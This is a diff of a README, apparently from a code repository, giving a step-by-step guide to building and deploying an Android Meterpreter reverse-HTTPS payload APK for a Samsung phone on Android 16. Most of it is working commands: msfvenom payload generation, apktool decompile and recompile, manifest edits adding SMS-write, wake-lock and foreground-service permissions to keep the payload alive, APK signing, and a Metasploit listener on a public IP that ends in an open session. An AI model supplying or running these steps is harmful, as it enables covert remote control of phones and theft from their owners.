@@ -1,4 +1,4 @@
-# Meterpreter Session on Android 16 - Samsung Z Flip 5 Rootless (2026):
+# Stageless Meterpreter Sessions on Android 16 - Samsung Z Flip 5 Rootless (2026):
 [![github-banner.jpg](https://i.postimg.cc/sxhdzJLF/github-banner.jpg)](https://postimg.cc/n9pwYqZT)
 # Android Penetration Testing Workflow: APK Modification & Local Deployment Guide:
 
@@ -24,7 +24,7 @@ Ensure you have the following tools installed and available in your system path 
 Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.
 
 ```bash
-msfvenom -p android/meterpreter/reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
+msfvenom -p android/meterpreter_reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
 ```
 ---
 
@@ -45,23 +45,70 @@ apktool d payload_example.apk -o example_folder
  nano AndroidManifest.xml
 ```
 ```bash
-# add these permissions to AndroidManifest.xml
- <uses-permission android:name="android.permission.WAKE_LOCK"/>
- <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
- <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>  
-  ```
+# Add ALL of this to beginning of the AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.metasploit.stage">
+
+    <uses-sdk
+        android:minSdkVersion="19"
+        android:targetSdkVersion="31"/>
+
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+
+# And replace <service near the bottom to this:
+ <service android:exported="false" android:name=".MainService" android:enabled="true" android:foregroundServiceType="specialUse"/>
+
+# And make sure this is present inside the <activity section:
+ android:exported="true"
+```
+```bash
+# Inside same folder 
+nano apktool.yml 
+```
+```bash
+# Replace entire text with this:(change name at top to your .apk app name)
+version: 2.9.3
+apkFileName:[YOUR_APP_NAME].apk
+isFrameworkApk: false
+usesFramework:
+  ids:
+  - 1
+  tag: null
+sdkInfo:
+  minSdkVersion: 21
+  targetSdkVersion: 31
+packageInfo:
+  forcedPackageId: 127
+  renameManifestPackage: null
+versionInfo:
+  versionCode: 1
+  versionName: 1.0
+resourcesAreCompressed: false
+sharedLibrary: false
+sparseResources: false
+doNotCompress:
+- resources.arsc
+- assets
+- png
+ ```
   ctrl + o then ENTER to save, ctrl + x to exit.
 
 ### 3. Recompile the APK
 ```bash
-# go back one directory
+# Go back one directory
 cd ..
 ```
 ```bash
-# then recompile the apk
+# Then recompile the apk
 apktool b example_folder -o payload_example.apk
-```
 
+```
 ---
 
 ## Step 3: Cryptographic Signing
@@ -69,7 +116,7 @@ apktool b example_folder -o payload_example.apk
 Android environments sometimes reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.
 
 ```bash
-# cd to where new apk is saved (possibly /example_folder/dist/)
+# Align the APK
 zipalign -v -p 4 payload_example.apk aligned_example.apk
 
 # Generate a development keystore
@@ -98,14 +145,13 @@ In a seperate terminal, start the Metasploit framework locally to listen for the
 msfconsole
 ```
 Inside the Metasploit console, execute the following handler configuration:
-
-```rc
+```
 use exploit/multi/handler
-set PAYLOAD android/meterpreter/reverse_https
+set PAYLOAD android/meterpreter_reverse_https
 set LHOST [YOUR PUBLIC IP]
 set LPORT 443
-set ExitOnSession false
-run -j
+set StageEncoder false
+run 
 ```
 ### Expected Output
 ```text
@@ -113,11 +159,14 @@ run -j
 ```
 ### Once session starts
 ```
+meterpreter > help (to see available commands)
+meterpreter > wakelock 
+background (to go back to msfconsole without killing session)
 sessions -l (to list sessions)
 sessions -i 1 (or # of session you want to open)
 ```
 ### BOOOOOOM!!!
-You got a meterpreter open! (type help to see commands available)
+You got stageless meterpreter sessions open! 
 
 Contributions are welcome!
 
